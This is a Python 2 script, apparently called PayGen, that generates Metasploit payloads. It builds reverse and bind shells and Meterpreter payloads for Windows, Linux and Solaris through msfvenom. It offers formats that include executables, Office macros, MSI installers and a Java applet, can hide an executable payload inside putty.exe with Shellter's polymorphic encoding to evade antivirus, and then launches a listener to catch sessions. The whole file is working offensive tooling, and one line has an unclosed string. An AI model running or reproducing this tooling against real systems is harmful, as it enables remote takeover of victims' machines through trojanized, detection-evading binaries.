# PayGen (www.hackwhackandsmack.com)
#
# Written by Ben Turner 2014-2015
#

import io, time, commands, os, subprocess, sys, signal, tempfile

currentdir = os.getcwd()

########## CONFIG ##########
msfdir = "/opt/msf-git/metasploit-framework/"
shellterdir = currentdir + "/shellter/"
javadir = currentdir + "/java/"

print ""
print "\033[0;32m==================================================================="
print "\033[0;32mMetasploit Payload Generator (Paygen) 2015 - Written by @benpturner" 
print "\033[0;32m==================================================================="


def readcmd(cmd):
    ftmp = tempfile.NamedTemporaryFile(suffix='.out', prefix='tmp', delete=False)
    fpath = ftmp.name
    if os.name=="nt":
        fpath = fpath.replace("/","\\") # forwin
    ftmp.close()
    os.system(cmd + " > " + fpath)
    data = ""
    with open(fpath, 'r') as file:
        data = file.read()
        file.close()
    os.remove(fpath)
    return data

def signal_handler(signal, frame):
        print('\n\n\033[0;31mExitting..............\n\n')
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


try:
	inteth = 'eth0'
	inteth_ip = commands.getoutput("ip address show dev " + inteth).split()
	inteth_ip = inteth_ip[inteth_ip.index('inet') + 1].split('/')[0]

except:
	inteth_ip = '127.0.0.1'

if (inteth_ip == '127.0.0.1'):
	try:
	        inteth = 'wlan0'
		inteth_ip = commands.getoutput("ip address show dev " + inteth).split()
		inteth_ip = inteth_ip[inteth_ip.index('inet') + 1].split('/')[0]
	except:
        	inteth_ip = '127.0.0.1'



outfile = {}
outfile['1']="/var/www/"
outfile['2']="/tmp/"
outfile['3']="/tftpboot/"
outfile['4']="/root/Desktop/"

menu = {}
menu['1']="windows/meterpreter/reverse_tcp"
menu['2']="windows/meterpreter/bind_tcp"
menu['3']="windows/meterpreter/reverse_https" 
menu['4']="windows/meterpreter/reverse_http"
menu['5']="windows/powershell_reverse_tcp"
menu['6']="windows/powershell_bind_tcp" 
menu['7']="windows/x64/powershell_reverse_tcp" 
menu['8']="windows/x64/powershell_bind_tcp" 
menu['9']="windows/x64/meterpreter/reverse_tcp"
menu['10']="windows/x64/meterpreter/bind_tcp" 
menu['11']="windows/x64/shell/reverse_tcp"
menu['12']="windows/x64/shell/bind_tcp"
menu['13']="linux/x86/shell/reverse_tcp"
menu['14']="linux/x86/shell/bind_tcp"
menu['15']="linux/x64/shell/reverse_tcp"
menu['16']="linux/x64/shell/bind_tcp"
menu['17']="solaris/sparc/shell_bind_tcp"                   
menu['18']="solaris/sparc/shell_find_port"                    
menu['19']="solaris/sparc/shell_reverse_tcp"                  
menu['20']="solaris/x86/shell_bind_tcp"                       
menu['21']="solaris/x86/shell_find_port"                      
menu['22']="solaris/x86/shell_reverse_tcp"   

#more options here

lport='443'
outputloc='/root/Desktop/'
payloadformat='exe'

print ""
ipaddr = raw_input("\033[0;31mPlease enter LHOST IP Address [" + inteth_ip + "]: \033[0m") or inteth_ip
lport = raw_input("\033[0;31mPlease enter LPORT TCP Port [" + lport + "]: \033[0m") or lport
#outputloc = raw_input("\033[0;31mPlease enter Output location of Payload [" + outputloc + "]: \033[0m") or outputloc
print""
print "java-applet, macro"
print "asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war"
payloadformat = raw_input("\033[0;31mPlease enter value for the Payload format [" + payloadformat + "]: \033[0m") or payloadformat
print ""

#option for encoding

payload = "windows/meterpreter/reverse_https"
payselect = '3'

while True:
	outputoptions=outfile.keys()
	for entry in outputoptions:
		print entry, outfile[entry]

	print ""
	
	outputselection = raw_input("\033[0;32mPlease enter your output directory [" + outputloc + "]: \033[0m") or outputloc
	try:	
		outputloc = outfile[outputselection]
		break
	except:
		print "\033[0;31mError with output selection reverting back to default [" + outputloc + "]\n\033[0m"
		break
while True: 
	options=menu.keys()
	options.sort(key=int)
	for entry in options: 
		print entry, menu[entry]

	print ""
		
	selection = raw_input("\033[0;32mPlease Select Payload [" + payselect + "]: \033[0m") or payselect
	#outputselection = raw_input("") or outputloc
	try:
		#outputloc = outfile[outputselection]
		paynum = int(selection)
		payload = menu[selection]
		break
	except:
		print "Unknown Option Selected" 
		exit()
print ""

# this would be better as a case

if payloadformat == 'psh':
	outputname = 'payload.ps1'
elif payloadformat == 'aspx':
	outputname = 'Payload.aspx'
elif payloadformat == 'exe':
	outputname = 'Payload.exe'
elif payloadformat == 'exe-service':
	outputname = 'Payload-service.exe'
elif payloadformat == 'dll':
	outputname = 'Payload.dll'
elif payloadformat == 'vbs':
	outputname = 'Payload.vbs'
elif payloadformat == 'war':
	outputname = 'Payload.war'
elif payloadformat == 'msi':
	outputname = 'Payload.msi'
elif payloadformat == 'vba':
    outputname = 'Payload.vba'
elif payloadformat == 'raw':
    outputname = 'Payload.txt'
elif payloadformat == 'java-applet':
    outputname = 'java.html'
else:
	print "Unknown Output Format"
	outputname = 'Payload.bin
	exit()


if payloadformat == 'java-applet':
	#outputloc = raw_input("\033[0;32mDo you want this in [y/N]: \033[0m") or "N"

	payloadbase64 = readcmd("msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f raw | base64 | tr -d '\n' ")
	appletfile = open(outputloc + outputname, "w")

	appletfile.write("<applet width=\"1\" height=\"1\" code=\"Java.class\" archive=\"examplepx.jar\">\n<param name=\"id\" value=\""+payloadbase64+"\" />\n<param name=\"type\" value=\"service\" />\n</applet>")
	appletfile.close()
	javaapplet = javadir+"examplepx.jar"
	os.system ("cp %s %s" % (javaapplet, outputloc))

elif payloadformat == 'exe':
	shellter = raw_input("\033[0;31mDo you want to shellter the executable [Y/n]: \033[0m") or "Y"
	
	if (shellter == "Y") or (shellter =="y"):
			shellterexe = raw_input("\033[0;31mUse putty.exe as the executable in shellter [Y/n]: \033[0m") or "Y"
			with open(outputloc + outputname, "w") as outfile:
				subprocess.call('msfvenom -f ' + "raw" + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)

			msfpay = outputloc + outputname
			if (shellterexe == "Y") or (shellterexe =="y"):
				#copy putty.exe to 
				shellterputtyback = shellterdir+"putty.back"
				shellterpayloadexe = shellterdir+"putty.exe"
				os.system ("cp %s %s" % (shellterputtyback, shellterpayloadexe))
				
			else:
				shellterpayloadexe = raw_input("\033[0;31mPath to real executable that can be used in shellter: \033[0m")

			os.system("wine "+shellterdir+"shellter.exe -f "+shellterpayloadexe+" -p "+msfpay+" --encode --handler iat --polyiat --polyDecoder")
			shellterputtyback = shellterdir+"putty.exe"
			os.system ("cp %s %s" % (shellterputtyback, msfpay))
	else:
		with open(outputloc + outputname, "w") as outfile:
			subprocess.call('msfvenom -f ' + payloadformat + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)

# sleep a little
time.sleep(2)

# Do you want a multi/handler set up
print ""
handler = raw_input("\033[0;31mSetup multi/handler [Y/n]: \033[0m") or "Y"

if (handler == "Y") or (handler =="y"):
	subprocess.call('msfconsole -x "use multi/handler; set PAYLOAD ' + payload + '; set LHOST ' + ipaddr + '; set LPORT ' + lport + '; set ExitOnSession false; exploit -j;"', shell=True)
